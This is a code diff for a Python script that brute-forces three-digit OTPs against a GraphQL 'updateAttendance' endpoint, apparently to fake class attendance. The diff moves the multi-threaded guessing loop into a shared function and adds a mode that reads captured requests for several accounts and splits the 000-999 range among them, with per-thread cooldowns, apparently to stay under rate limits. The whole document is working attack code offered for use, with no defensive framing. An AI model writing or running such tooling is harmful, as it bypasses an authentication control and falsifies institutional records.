@@ -86,17 +86,168 @@ def load_config():
 
 import concurrent.futures
 
-def check_otp(otp):
+
+def check_otp(otp, url=None, headers=None):
+    # Use passed values or fallback to globals (though ideally we always pass them now)
+    target_url = url if url else URL
+    target_headers = headers if headers else HEADERS
+
     payload = {
         "operationName": "updateAttendance",
         "variables": {"otp": otp},
         "query": "mutation updateAttendance($otp: String!) {\n  updateAttendance(otp: $otp) {\n    id\n    attendance\n    classcode\n    date\n    startTime\n    endTime\n    classType\n    __typename\n  }\n}\n"
     }
     try:
-        response = requests.post(URL, headers=HEADERS, json=payload)
+        response = requests.post(target_url, headers=target_headers, json=payload)
         return response.json(), None
     except Exception as e:
         return None, e
+
+import random
+
+def run_attack_core(target_url, target_headers, num_threads, cooldown, account_name="Unknown", stop_event=None, print_lock=None, range_start=0, range_end=1000):
+    """
+    Core function to run the multi-threaded attack for a specific configuration.
+    args:
+        stop_event: Optional threading.Event shared across accounts. If None, creates local one.
+        print_lock: Optional threading.Lock shared across accounts. If None, creates local one.
+        range_start: Start of OTP range (inclusive).
+        range_end: End of OTP range (exclusive).
+    """
+    # Setup synchronization primitives
+    is_main_monitor = False
+    if stop_event is None:
+        stop_event = threading.Event()
+        is_main_monitor = True # Only this instance should monitor keyboard
+    
+    if print_lock is None:
+        print_lock = threading.Lock()
+
+    with print_lock:
+        print(font(f"\n [Attack] Starting for: {account_name} ", color="yellow", inverse=True))
+        print(font(f" [{account_name}] Range: {range_start:03d}-{range_end-1:03d} | Threads: {num_threads} | Cooldown: {cooldown}s ", color="cyan"))
+    
+    # Internal separate event for success to stop just this account's threads?
+    # Actually if one account succeeds, we probably don't want to stop ALL accounts if they are different?
+    # BUT usually brute forcing is for one specific outcome. 
+    # Let's assume finding an OTP for ONE account shouldn't stop OTHERS.
+    # So we need a local success event.
+    success_event = threading.Event()
+    
+    found_otp = [None]  # Use list to allow modification in closure
+    
+    # Generate Sequential List for assigned range
+    all_otps = [f"{i:03d}" for i in range(range_start, range_end)]
+    
+    def worker_thread(thread_id, allocated_otps):
+        """Worker thread to check a specific list of OTPs"""
+        for otp in allocated_otps:
+            # Check if we should stop
+            if stop_event.is_set() or success_event.is_set():
+                return
+            
+            # Make request
+            response_json, error = check_otp(otp, url=target_url, headers=target_headers)
+            
+            if error:
+                with print_lock:
+                    print(font(f" [{account_name}] [Thread {thread_id}] [ERROR] {otp}: {error}", color="red"))
+            else:
+                # Check for success
+                if 'data' in response_json and response_json['data'] and response_json['data'].get('updateAttendance'):
+                    with print_lock:
+                        print(font(f"\n [{account_name}] [Thread {thread_id}] [SUCCESS] OTP Found: {otp} ", color="green", inverse=True))
+                        found_otp[0] = otp
+                    success_event.set()  # Signal all threads for THIS account to stop
+                    return
+                
+                # Check for errors
+                elif 'errors' in response_json:
+                    error_msg = response_json['errors'][0]['message']
+                    with print_lock:
+                        if "You are not registered to this class" in error_msg:
+                            print(f" [{account_name}] [Thread {thread_id}] [FAILED] {otp} - Not Result")
+                        else:
+                            print(f" [{account_name}] [Thread {thread_id}] [FAILED] {otp} - {error_msg}")
+                else:
+                    with print_lock:
+                        print(f" [{account_name}] [Thread {thread_id}] [FAILED] {otp} (Unknown response)")
+            
+            # Cooldown for this thread
+            slept = 0
+            while slept < cooldown:
+                if stop_event.is_set() or success_event.is_set():
+                    return
+                time.sleep(0.05)
+                slept += 0.05
+        
+        with print_lock:
+            print(font(f" [{account_name}] [Thread {thread_id}] Completed assigned chunk", color="cyan"))
+    
+    # Distribute the randomized OTPs to chunks
+    chunk_size = len(all_otps) // num_threads
+    threads = []
+    
+    for i in range(num_threads):
+        start_idx = i * chunk_size
+        # Last thread gets any remainder
+        end_idx = (i + 1) * chunk_size if i < num_threads - 1 else len(all_otps)
+        
+        chunk = all_otps[start_idx:end_idx]
+        
+        thread = threading.Thread(target=worker_thread, args=(i+1, chunk))
+        thread.daemon = True
+        threads.append(thread)
+    
+    # Start all threads
+    with print_lock:
+        print(font(f" [{account_name}] Threads running with randomized OTPs...", color="cyan"))
+    
+    for thread in threads:
+        thread.start()
+    
+    # Monitor Logic
+    try:
+        while any(t.is_alive() for t in threads):
+            # If we are the main monitor (single mode), we check keyboard
+            if is_main_monitor:
+                if keyboard.is_pressed('q') or keyboard.is_pressed('esc'):
+                    with print_lock:
+                        print(font("\n\n [!] User Cancellation Requested ", color="yellow", inverse=True))
+                    stop_event.set()
+                    break
+            else:
+                # In multi-mode, we just check if the external stop event happened
+                if stop_event.is_set():
+                    break
+            
+            time.sleep(0.1)
+            
+    except KeyboardInterrupt:
+        if is_main_monitor:
+            with print_lock:
+                print(font("\n\n [!] Keyboard Interrupt ", color="yellow", inverse=True))
+            stop_event.set()
+    
+    # Wait for all threads to finish
+    # We don't print "Waiting for threads..." here to avoid spam in multi-mode
+    for thread in threads:
+        thread.join(timeout=2.0)
+    
+    # Final results
+    if found_otp[0]:
+        with print_lock:
+            print(font(f"\n [{account_name}] [FINAL RESULT] OTP Found: {found_otp[0]} ", color="green", inverse=True))
+    elif stop_event.is_set():
+        # Only print cancelled if we are the ones handling it or just once? 
+        # In multi-mode we might get spam "Cancelled". Let's reduce noise.
+        with print_lock:
+            print(font(f" [{account_name}] Stopped.", color="yellow"))
+    else:
+        with print_lock:
+            print(font(f"\n [{account_name}] Finished range. No valid OTP found.", color="cyan"))
+
+    return found_otp[0]
 
 def start():
     if not load_config():
@@ -122,14 +273,12 @@ def start():
             otp = f"{i:03d}"
             
             # Submit the request to a separate thread
-            future = executor.submit(check_otp, otp)
+            future = executor.submit(check_otp, otp, URL, HEADERS)
 
             # Wait for completion or interrupt
             while not future.done():
                 if keyboard.is_pressed('q') or keyboard.is_pressed('esc'):
                     print(font("\n [!] Process Cancelled ", color="yellow", inverse=True))
-                    # We cannot kill the thread, but we return immediately.
-                    # The thread will finish in background but output is ignored.
                     time.sleep(2)
                     return
                 time.sleep(0.05)
@@ -140,25 +289,18 @@ def start():
             if error:
                 print(font(f" [ERROR] Request failed for {otp}: {error}", color="red"))
             else:
-                # Check for success
                 if 'data' in response_json and response_json['data'] and response_json['data'].get('updateAttendance'):
                     print(font(f" [SUCCESS] OTP Found: {otp} ", color="green", inverse=True))
-                    # Optional: print details
-                    # print(json.dumps(response_json['data'], indent=2))
                     break 
-
-                # Check for errors
                 elif 'errors' in response_json:
                     error_msg = response_json['errors'][0]['message']
                     if "You are not registered to this class" in error_msg:
                          print(f" [FAILED] {otp} - Not Result")
                     else:
                          print(f" [FAILED] {otp} - {error_msg}")
-                
                 else:
                     print(f" [FAILED] {otp} (Unknown response)")
 
-            # Smart sleep to allow interrupt during cooldown
             slept = 0
             while slept < cooldown:
                 if keyboard.is_pressed('q') or keyboard.is_pressed('esc'):
@@ -196,110 +338,132 @@ def start_experimental():
         print(" Invalid input. Using default 0.5s.")
         cooldown = 0.5
     
-    print(font(f"\n Starting Experimental Multi-Threaded Attack ", color="yellow", inverse=True))
-    print(font(f" Threads: {num_threads} | Cooldown: {cooldown}s/thread ", color="cyan", inverse=True))
-    print(font("\n [!] WARNING: High thread counts may trigger rate limiting! ", color="red", inverse=True))
-    
-    # Shared state
-    stop_event = threading.Event()  # Signal to stop all threads
-    success_event = threading.Event()  # Signal that OTP was found
-    print_lock = threading.Lock()  # For thread-safe printing
-    found_otp = [None]  # Use list to allow modification in closure
-    
-    def worker_thread(thread_id, start_range, end_range):
-        """Worker thread to check a range of OTPs"""
-        for i in range(start_range, end_range):
-            # Check if we should stop
-            if stop_event.is_set() or success_event.is_set():
-                with print_lock:
-                    print(font(f" [Thread {thread_id}] Stopped", color="yellow"))
-                return
-            
-            otp = f"{i:03d}"
-            
-            # Make request
-            response_json, error = check_otp(otp)
-            
-            if error:
-                with print_lock:
-                    print(font(f" [Thread {thread_id}] [ERROR] {otp}: {error}", color="red"))
-            else:
-                # Check for success
-                if 'data' in response_json and response_json['data'] and response_json['data'].get('updateAttendance'):
-                    with print_lock:
-                        print(font(f"\n [Thread {thread_id}] [SUCCESS] OTP Found: {otp} ", color="green", inverse=True))
-                        found_otp[0] = otp
-                    success_event.set()  # Signal all threads to stop
-                    return
-                
-                # Check for errors
-                elif 'errors' in response_json:
-                    error_msg = response_json['errors'][0]['message']
-                    with print_lock:
-                        if "You are not registered to this class" in error_msg:
-                            print(f" [Thread {thread_id}] [FAILED] {otp} - Not Result")
-                        else:
-                            print(f" [Thread {thread_id}] [FAILED] {otp} - {error_msg}")
-                else:
-                    with print_lock:
-                        print(f" [Thread {thread_id}] [FAILED] {otp} (Unknown response)")
-            
-            # Cooldown for this thread
-            slept = 0
-            while slept < cooldown:
-                if stop_event.is_set() or success_event.is_set():
-                    return
-                time.sleep(0.05)
-                slept += 0.05
-        
-        with print_lock:
-            print(font(f" [Thread {thread_id}] Completed range {start_range:03d}-{end_range-1:03d}", color="cyan"))
-    
-    # Calculate ranges for each thread
-    total_range = 1000  # 000-999
-    chunk_size = total_range // num_threads
-    threads = []
-    
-    for i in range(num_threads):
-        start = i * chunk_size
-        # Last thread gets any remainder
-        end = (i + 1) * chunk_size if i < num_threads - 1 else total_range
-        
-        thread = threading.Thread(target=worker_thread, args=(i+1, start, end))
-        thread.daemon = True
-        threads.append(thread)
-    
-    # Start all threads
-    print(font("\n Starting threads...\n", color="cyan"))
-    for thread in threads:
-        thread.start()
-    
-    # Monitor for user cancellation
-    try:
-        while any(t.is_alive() for t in threads):
-            if keyboard.is_pressed('q') or keyboard.is_pressed('esc'):
-                print(font("\n\n [!] User Cancellation Requested ", color="yellow", inverse=True))
-                stop_event.set()
-                break
-            time.sleep(0.1)
-    except KeyboardInterrupt:
-        print(font("\n\n [!] Keyboard Interrupt ", color="yellow", inverse=True))
-        stop_event.set()
-    
-    # Wait for all threads to finish
-    print(font("\n Waiting for threads to finish...", color="cyan"))
-    for thread in threads:
-        thread.join(timeout=2.0)
-    
-    # Final results
-    if found_otp[0]:
-        print(font(f"\n [FINAL RESULT] OTP Found: {found_otp[0]} ", color="green", inverse=True))
-    elif stop_event.is_set():
-        print(font("\n Attack Cancelled.", color="yellow", inverse=True))
-    else:
-        print(font("\n Attack Complete. No valid OTP found.", color="cyan", inverse=True))
+    run_attack_core(URL, HEADERS, num_threads, cooldown, account_name="Main Config")
     
     input("\n Press Enter to return to menu...")
+
+def load_config_from_file(file_path):
+    """Helper to load config from a specific file path"""
+    try:
+        with open(file_path, 'r', encoding='utf-8') as f:
+            content = f.read().strip()
+            if content:
+                parsed_url, parsed_headers = parse_curl(content)
+                return parsed_url, parsed_headers
+    except Exception as e:
+        print(font(f" [Config] Error reading {file_path}: {e}", color="red"))
+    return None, None
+
+def run_multi_account_attack():
+    """Concurrently iterates through Input/SavedRequests and runs attack for each."""
+    saved_requests_dir = os.path.join(os.getcwd(), 'Input', 'SavedRequests')
+    
+    if not os.path.exists(saved_requests_dir):
+        print(font(" [INFO] No SavedRequests folder found. Create it and add requests via the menu.", color="yellow"))
+        input(" Press Enter to return...")
+        return
+
+    files = [f for f in os.listdir(saved_requests_dir) if f.endswith('.txt')]
+    
+    if not files:
+        print(font(" [INFO] No saved requests found in Input/SavedRequests.", color="yellow"))
+        input(" Press Enter to return...")
+        return
+        
+    count_accounts = len(files)
+    print(font(f"\n Found {count_accounts} accounts to attack.", color="cyan", inverse=True))
+    for f in files:
+        print(f" - {f}")
+        
+    # Ask for settings once
+    try:
+        thread_input = input("\n Enter number of threads PER ACCOUNT (default 4): ")
+        num_threads = int(thread_input) if thread_input.strip() else 4
+    except:
+        num_threads = 4
+        
+    try:
+        cooldown_input = input(" Enter per-thread cooldown (default 0.5): ")
+        cooldown = float(cooldown_input) if cooldown_input.strip() else 0.5
+    except:
+        cooldown = 0.5
+
+    # Divide global range (1000) by number of accounts
+    total_otps = 1000
+    range_per_account = total_otps // count_accounts
+    
+    print(font("\n Starting Distributed Multi-Account Attack Sequence...", color="white", inverse=True))
+    print(font(f" Strategy: Distributed 000-999 across {count_accounts} accounts.", color="magenta"))
+    print(font(" Press 'q' or 'esc' to stop ALL attacks.", color="yellow"))
+    
+    shared_stop_event = threading.Event()
+    shared_print_lock = threading.Lock()
+    results = {}
+    
+    # Wrapper helper to run in thread and capture result
+    def attack_wrapper(acc_name, conf_url, conf_headers, start_r, end_r):
+        res = run_attack_core(conf_url, conf_headers, num_threads, cooldown, 
+                              account_name=acc_name, 
+                              stop_event=shared_stop_event, 
+                              print_lock=shared_print_lock,
+                              range_start=start_r,
+                              range_end=end_r)
+        results[acc_name] = res if res else "Failed"
+
+    account_threads = []
+
+    for i, filename in enumerate(files):
+        file_path = os.path.join(saved_requests_dir, filename)
+        account_name = os.path.splitext(filename)[0]
+        
+        # Calculate range for this account
+        start_r = i * range_per_account
+        # Last account grabs the remainder up to 1000
+        end_r = (i + 1) * range_per_account if i < count_accounts - 1 else total_otps
+        
+        url, headers = load_config_from_file(file_path)
+        
+        if not url or not headers:
+            with shared_print_lock:
+                print(font(f" [SKIP] Could not load config for {account_name}", color="red"))
+            results[account_name] = "Failed to load config"
+            continue
+            
+        t = threading.Thread(target=attack_wrapper, args=(account_name, url, headers, start_r, end_r))
+        t.daemon = True
+        account_threads.append(t)
+        t.start()
+        
+        # Stagger starts slightly to avoid instantaneous blast
+        time.sleep(0.1)
+
+    # Main monitoring loop for cancellation
+    try:
+        while any(t.is_alive() for t in account_threads):
+            if keyboard.is_pressed('q') or keyboard.is_pressed('esc'):
+                with shared_print_lock:
+                    print(font("\n\n [!] Stopping All Attacks... ", color="red", inverse=True))
+                shared_stop_event.set()
+                break # Break monitor loop, wait for threads to join
+            time.sleep(0.1)
+    except KeyboardInterrupt:
+        with shared_print_lock:
+            print(font("\n\n [!] Keyboard Interrupt. Stopping... ", color="red", inverse=True))
+        shared_stop_event.set()
+
+    # Wait for all account threads
+    for t in account_threads:
+        t.join(timeout=5.0) # Give them time to clean up
+        
+    print(font("\n === Multi-Account Attack Summary === ", color="green", inverse=True))
+    for filename in files:
+        acc = os.path.splitext(filename)[0]
+        res = results.get(acc, "Unknown/Cancelled")
+        color = "green" if res != "Failed" and "Failed" not in str(res) and "Cancelled" not in str(res) else "red"
+        print(font(f" {acc}: {res}", color=color))
+
+    input("\n Press Enter to return to menu...")
+
 
 def test_connection():
     if not load_config():
